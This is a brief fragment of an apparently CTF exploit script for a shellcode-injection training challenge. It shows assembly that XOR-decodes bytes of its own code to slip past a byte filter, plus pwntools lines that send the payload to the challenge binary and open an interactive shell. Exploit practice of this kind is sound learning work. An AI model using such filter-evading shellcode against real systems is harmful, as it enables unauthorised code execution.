...
push 0x20
pop rcx
xor byte ptr [rax+0x52], cl # rax为代码地址
xor byte ptr [rax+0x53], cl
xor byte ptr [rax+0x7d], cl
xor byte ptr [rax+0x7e], cl
""")
...
sh = process("/challenge/shellcode-injection-level3.0")
sh.send(payload)
sh.interactive()
